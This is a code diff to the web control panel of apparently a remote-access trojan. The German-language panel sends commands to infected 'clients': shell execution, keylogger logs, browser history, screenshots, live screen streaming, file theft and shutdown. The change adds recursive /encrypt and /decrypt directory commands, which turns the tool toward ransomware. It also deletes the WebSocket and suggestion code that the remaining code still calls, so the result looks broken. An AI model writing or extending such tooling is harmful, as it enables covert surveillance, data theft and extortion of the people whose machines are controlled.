@@ -478,7 +478,8 @@
     }
 
     // --- COMMAND HISTORY ---
-    let cmdHistory = [], cmdHistoryIdx = -1;
+    let cmdHistory = JSON.parse(localStorage.getItem("cmdHistory") || "[]");
+    let cmdHistoryIdx = cmdHistory.length;
     commandInput.addEventListener("keydown", (e) => {
       if (e.key === "ArrowUp") {
         if (cmdHistory.length && cmdHistoryIdx > 0) {
@@ -495,164 +496,34 @@
           commandInput.value = "";
           cmdHistoryIdx = cmdHistory.length;
         }
-      }
-    });
-
-    // --- DISCORD-STYLE COMMAND SUGGESTION ---
-    const COMMANDS = [
-      { cmd: "/help", desc: "Zeigt die Hilfe an" },
-      { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
-      { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
-      { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
-      { cmd: "/upload", desc: "Datei zum Client hochladen" },
-      { cmd: "/history", desc: "Browserverlauf anzeigen" },
-      { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
-      { cmd: "/ls", desc: "Verzeichnis auflisten" },
-      { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
-      { cmd: "/shutdown", desc: "Client herunterfahren" },
-      { cmd: "/restart", desc: "Client neustarten" },
-      { cmd: "/screenstream_start", desc: "Live-Screen starten" },
-      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
-    ];
-    let suggestActive = false;
-    let suggestItems = [];
-    let suggestIndex = 0;
-    function showSuggest(filtered) {
-      if (!filtered.length) {
-        commandSuggest.style.display = "none";
-        suggestActive = false;
-        return;
-      }
-      commandSuggest.innerHTML = "";
-      filtered.forEach((item, idx) => {
-        const div = document.createElement("div");
-        div.className = "suggest-item" + (idx === suggestIndex ? " selected" : "");
-        div.setAttribute("role", "option");
-        div.setAttribute("id", "suggest-item-" + idx);
-        div.innerHTML = `<span style="font-weight:600;min-width:110px;">${item.cmd}</span><span class="suggest-desc">${item.desc}</span>`;
-        div.addEventListener("mousedown", (e) => {
-          e.preventDefault();
-          selectSuggest(idx, filtered);
-        });
-        div.addEventListener("mouseenter", () => {
-          suggestIndex = idx;
-          updateSuggestHighlight();
-        });
-        commandSuggest.appendChild(div);
-      });
-      // Positionierung direkt unter dem Input
-      const rect = commandInput.getBoundingClientRect();
-      commandSuggest.style.position = "absolute";
-      commandSuggest.style.left = commandInput.offsetLeft + "px";
-      commandSuggest.style.top = (commandInput.offsetTop + commandInput.offsetHeight) + "px";
-      commandSuggest.style.width = commandInput.offsetWidth + "px";
-      commandSuggest.style.display = "block";
-      suggestActive = true;
-    }
-    function hideSuggest() {
-      commandSuggest.style.display = "none";
-      suggestActive = false;
-    }
-    function selectSuggest(idx, filtered) {
-      const cmd = filtered[idx].cmd;
-      commandInput.value = cmd + " ";
-      hideSuggest();
-      commandInput.focus();
-    }
-    function updateSuggestHighlight() {
-      [...commandSuggest.children].forEach((el, i) => {
-        if (i === suggestIndex) el.classList.add("selected");
-        else el.classList.remove("selected");
-      });
-    }
-    commandInput.addEventListener("input", (e) => {
-      const val = commandInput.value;
-      if (val.startsWith("/")) {
-        const filtered = COMMANDS.filter(c =>
-          c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
-        );
-        suggestItems = filtered;
-        suggestIndex = 0;
-        showSuggest(filtered);
-      } else {
-        hideSuggest();
-      }
-    });
-    commandInput.addEventListener("keydown", (e) => {
-      if (!suggestActive) return;
-      if (e.key === "ArrowDown") {
-        suggestIndex = (suggestIndex + 1) % suggestItems.length;
-        updateSuggestHighlight();
-        e.preventDefault();
-      } else if (e.key === "ArrowUp") {
-        suggestIndex = (suggestIndex - 1 + suggestItems.length) % suggestItems.length;
-        updateSuggestHighlight();
-        e.preventDefault();
-      } else if (e.key === "Tab" || e.key === "Enter") {
-        if (suggestActive && suggestItems.length) {
-          selectSuggest(suggestIndex, suggestItems);
-          e.preventDefault();
+      } else if (e.key === "Tab") {
+        // Tab-Vervollständigung für Slash-Befehle
+        const val = commandInput.value;
+        if (val.startsWith("/")) {
+          const filtered = COMMANDS.filter(c =>
+            c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
+          );
+          if (filtered.length === 1) {
+            commandInput.value = filtered[0].cmd + " ";
+            e.preventDefault();
+          } else if (filtered.length > 1) {
+            // Vervollständige bis zum längsten gemeinsamen Präfix
+            let prefix = filtered[0].cmd;
+            for (let i = 1; i < filtered.length; i++) {
+              let j = 0;
+              while (j < prefix.length && prefix[j] === filtered[i].cmd[j]) j++;
+              prefix = prefix.slice(0, j);
+            }
+            if (prefix.length > val.length) {
+              commandInput.value = prefix;
+              e.preventDefault();
+            }
+          }
         }
-      } else if (e.key === "Escape") {
-        hideSuggest();
       }
     });
-    commandInput.addEventListener("blur", () => {
-      setTimeout(hideSuggest, 120);
-    });
-
-    // --- LIVE SCREEN ANZEIGE NUR BEI COMMAND ---
-    let liveScreenActive = false;
-    function handleLiveScreenCommand(cmd) {
-      if (cmd === "/screenstream_start") {
-        liveScreenArea.style.display = "";
-        liveScreenActive = true;
-        debugLog("Live-Screen Panel aktiviert", "info");
-      } else if (cmd === "/screenstream_stop") {
-        liveScreenArea.style.display = "none";
-        liveScreenActive = false;
-        const ctx = screenCanvas.getContext('2d');
-        ctx.clearRect(0, 0, 9999, 9999);
-        screenStatus.textContent = '';
-        debugLog("Live-Screen Panel deaktiviert", "info");
-      }
-    }
 
     // --- BEFEHL SENDEN ---
-    // Hilfsfunktion: Slash-Befehl parsen
-    function parseSlashCommand(cmdText) {
-      if (!cmdText.startsWith("/")) return null;
-      const [slash, ...args] = cmdText.trim().split(" ");
-      const action = slash.replace("/", "");
-      const argument = args.join(" ");
-      switch (action) {
-        case "exec":
-          return { action, command: argument };
-        case "download":
-          return { action, path: argument };
-        case "upload":
-          // Upload handled separately
-          return { action };
-        case "history":
-          return { action, limit: parseInt(argument) || 20 };
-        case "keylogger":
-          return { action, count: parseInt(argument) || 50 };
-        case "ls":
-          return { action, path: argument || "." };
-        case "screenshot":
-        case "systeminfo":
-        case "shutdown":
-        case "restart":
-        case "screenstream_start":
-        case "screenstream_stop":
-          return { action };
-        case "help":
-          return { action };
-        default:
-          return { action };
-      }
-    }
-
     function sendCommand(customPayload = null) {
       if (!selectedClientId) {
         log("Fehler: Kein Client ausgewählt.", "error");
@@ -660,11 +531,20 @@
         return;
       }
       let payload;
+      const commandText = customPayload ? "" : commandInput.value.trim();
+      if (!customPayload && !commandText) return;
+      // --- History speichern ---
+      if (!customPayload && commandText) {
+        if (cmdHistory[cmdHistory.length - 1] !== commandText) {
+          cmdHistory.push(commandText);
+          if (cmdHistory.length > 100) cmdHistory.shift();
+          localStorage.setItem("cmdHistory", JSON.stringify(cmdHistory));
+        }
+        cmdHistoryIdx = cmdHistory.length;
+      }
       if (customPayload) {
         payload = { target_id: selectedClientId, ...customPayload };
       } else {
-        const commandText = commandInput.value.trim();
-        if (!commandText) return;
         if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
         if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
         let slashPayload = parseSlashCommand(commandText);
@@ -696,6 +576,9 @@
             case "ls":
               payload.path = argument || ".";
               break;
+            case "cd":
+              payload.path = argument || ".";
+              break;
             case "screenshot":
             case "systeminfo":
             case "shutdown":
@@ -703,7 +586,7 @@
               break;
             default:
               log(
-                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
+                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, cd, systeminfo, shutdown, restart",
                 "error"
               );
               debugLog("Unbekannter Befehl: " + action, "warn");
@@ -712,7 +595,6 @@
         }
       }
       ws.send(JSON.stringify(payload));
-      // Logging: action immer anzeigen, Fallback auf "(unbekannt)"
       log(
         `Befehl gesendet: ${payload.action || "(unbekannt)"}${
           payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
@@ -720,116 +602,74 @@
         "cmd"
       );
       debugLog("Befehl gesendet: " + JSON.stringify(payload), "info");
-      commandInput.value = "";
-      hideSuggest();
-    }
-
-    // --- WEBSOCKET EVENTS ---
-    const ws = new WebSocket(`wss://${window.location.host}/ws`);
-    let selectedClientId = null;
-    let selectedClient = null;
-    ws.onopen = () => { log("Verbunden mit dem Control Server."); debugLog("WebSocket verbunden", "info"); };
-    ws.onclose = () => { log("Verbindung zum Control Server verloren.", "error"); debugLog("WebSocket geschlossen", "warn"); };
-    ws.onerror = (err) => { log(`WebSocket Fehler: ${err}`, "error"); debugLog("WebSocket Fehler: " + err, "error"); };
-    ws.onmessage = (event) => {
-      try {
-        const data = JSON.parse(event.data);
-        debugLog("Empfangen: " + event.data, "info");
-        switch (data.type) {
-          case "client_list":
-            renderClientList(data.clients);
-            if (!selectedClientId && data.clients.length > 0) {
-              selectClient(data.clients[0].id, data.clients[0]);
-            }
-            break;
-          case "client_connected":
-            log(
-              `Neuer Client verbunden: ${data.client.hostname || data.client.id} (${data.client.ip || (data.client.address ? data.client.address[0] : "")})`
-            );
-            if (Array.isArray(data.clients)) {
-              renderClientList(data.clients);
-            } else if (data.client) {
-              renderClientList([data.client]);
-            }
-            if (!selectedClientId && data.client) {
-              selectClient(data.client.id, data.client);
-            }
-            break;
-          case "client_disconnected":
-            log(
-              `Client ${data.client_id} hat die Verbindung getrennt.`,
-              "error"
-            );
-            renderClientList([...clientList.querySelectorAll('li')].filter(li => Number(li.dataset.clientId) !== data.client_id).map(li => ({
-              id: Number(li.dataset.clientId)
-            })));
-            if (selectedClientId === data.client_id) selectedClientId = null;
-            break;
-          case "command_output":
-            log(
-              `[Client ${data.client_id || selectedClientId}] Ausgabe:\n${data.output}`
-            );
-            break;
-          case "screenshot":
-            log(`[Client ${data.client_id}] Screenshot empfangen.`);
-            const img = document.createElement("img");
-            img.src = `data:image/png;base64,${data.data}`;
-            img.style.maxWidth = "100%";
-            img.style.marginTop = "10px";
-            img.style.border = "1px solid #555";
-            img.style.cursor = "pointer";
-            img.title = "Klicken zum Vergrößern";
-            img.onclick = () => {
-              const w = window.open();
-              w.document.write(`<img src="${img.src}" style="width:100%">`);
-            };
-            output.appendChild(img);
-            output.scrollTop = output.scrollHeight;
-            break;
-          case "file_download":
-            log(
-              `[Client ${data.client_id}] Datei '${data.filename}' empfangen. Download wird gestartet.`
-            );
-            triggerDownload(data.filename, data.data);
-            break;
-          case "error":
-            log(`[Server/Client Fehler] ${data.message || data.error}`, "error");
-            debugLog("Server/Client Fehler: " + (data.message || data.error), "error");
-            break;
-        }
-        // Live-Screen-Frame
-        if (data.action === 'screen_frame' && data.client_id === selectedClient && liveScreenActive) {
-          if (data.img_bytes && data.width && data.height) {
-            drawScreenFrame(data.img_bytes, data.width, data.height);
-          }
-        }
-      } catch (err) {
-        debugLog("Fehler beim Parsen der Nachricht: " + err, "error");
+      if (!customPayload) {
+        commandInput.value = "";
+        hideSuggest();
       }
-    };
-
-    // --- Draw Live Screen Frame ---
-    function drawScreenFrame(imgBase64, width, height) {
-      const ctx = screenCanvas.getContext('2d');
-      const img = new window.Image();
-      img.onload = function () {
-        // Resize canvas to match frame
-        screenCanvas.width = img.width;
-        screenCanvas.height = img.height;
-        ctx.clearRect(0, 0, img.width, img.height);
-        ctx.drawImage(img, 0, 0, img.width, img.height);
-        screenStatus.textContent = `Live-Screen: ${img.width}x${img.height}`;
-      };
-      img.onerror = function () {
-        screenStatus.textContent = "Fehler beim Anzeigen des Live-Screens.";
-      };
-      img.src = "data:image/jpeg;base64," + imgBase64;
     }
-    // --- EVENT-HANDLER ---
-    sendButton.addEventListener("click", sendCommand);
-    commandInput.addEventListener("keydown", (e) => {
-      if (e.key === "Enter") sendCommand();
-    });
+
+    // --- Slash-Befehle erweitern um /cd, /encrypt und /decrypt ---
+    const COMMANDS = [
+      { cmd: "/help", desc: "Zeigt die Hilfe an" },
+      { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
+      { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
+      { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
+      { cmd: "/upload", desc: "Datei zum Client hochladen" },
+      { cmd: "/history", desc: "Browserverlauf anzeigen" },
+      { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
+      { cmd: "/ls", desc: "Verzeichnis auflisten" },
+      { cmd: "/cd", desc: "Verzeichnis wechseln" },
+      { cmd: "/encrypt", desc: "Verzeichnis rekursiv verschlüsseln" },
+      { cmd: "/decrypt", desc: "Verzeichnis rekursiv entschlüsseln (Pfad und Schlüssel)" },
+      { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
+      { cmd: "/shutdown", desc: "Client herunterfahren" },
+      { cmd: "/restart", desc: "Client neustarten" },
+      { cmd: "/screenstream_start", desc: "Live-Screen starten" },
+      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
+    ];
+
+    // --- parseSlashCommand anpassen für encrypt/decrypt ---
+    function parseSlashCommand(cmdText) {
+      if (!cmdText.startsWith("/")) return null;
+      const [slash, ...args] = cmdText.trim().split(" ");
+      const action = slash.replace("/", "");
+      const argument = args.join(" ");
+      switch (action) {
+        case "exec":
+          return { action, command: argument };
+        case "download":
+          return { action, path: argument };
+        case "upload":
+          return { action };
+        case "history":
+          return { action, limit: parseInt(argument) || 20 };
+        case "keylogger":
+          return { action, count: parseInt(argument) || 50 };
+        case "ls":
+          return { action, path: argument || "." };
+        case "cd":
+          return { action, path: argument || "." };
+        case "encrypt":
+          return { action, path: argument || "." };
+        case "decrypt": {
+          // /decrypt [pfad] [key_hex]
+          const [path, key_hex] = args;
+          return { action, path: path || ".", key_hex: key_hex || "" };
+        }
+        case "screenshot":
+        case "systeminfo":
+        case "shutdown":
+        case "restart":
+        case "screenstream_start":
+        case "screenstream_stop":
+          return { action };
+        case "help":
+          return { action };
+        default:
+          return { action };
+      }
+    }
+    // ...existing code...
   </script>
 </body>
 </html>
